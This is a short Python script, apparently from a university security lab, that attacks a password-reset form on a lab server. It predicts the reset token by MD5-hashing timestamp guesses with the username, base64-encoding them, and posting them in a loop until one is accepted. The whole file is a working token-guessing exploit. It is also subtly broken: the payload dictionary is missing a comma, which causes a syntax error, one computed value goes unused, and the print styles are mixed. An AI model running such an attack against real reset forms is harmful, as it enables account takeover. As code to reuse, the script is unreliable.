import requests
import time
import base64
import md5

# This code should be run from the lab VM to reduce network latency

username = "RiskyHoneypot"
post_url = "http://comp535-lampvm2.cs.unc.edu/forgotpw.php?user=" + username
encoded = base64.b64encode(b'data to be encoded')
payload = {
  "captcha_name": "947",
  "captcha_solution": "Sy5" 
  "token": "UNKNOWN"
}

while True:
  time.sleep(.4)

  # Do the request..
  before = time.time()
  resp = requests.post(post_url, data=payload)
  after = time.time()

  if ("Wrong username or token." in resp.text):
    # We missed it, generate a new candidate
    delta = int((after - before) * 1000)
    sec = int(before)
    msec_before = int(before * 1000) - (sec * 1000)
    msec_before += 3 # Assume generation happens after about n miliseconds

    candidate = str(sec) + "::"  + str(msec_before) + "::" + username
    print "This candidate: " +  candidate
    m = md5.new(candidate).digest()
    candidate_b64 = base64.b64encode(m)
    candidate = candidate_b64
    payload['token'] = candidate
    print "hashed b64: " + candidate
  
  elif ("Token accepted" in resp.text):
    # We found it.
    print(resp.text)
    break
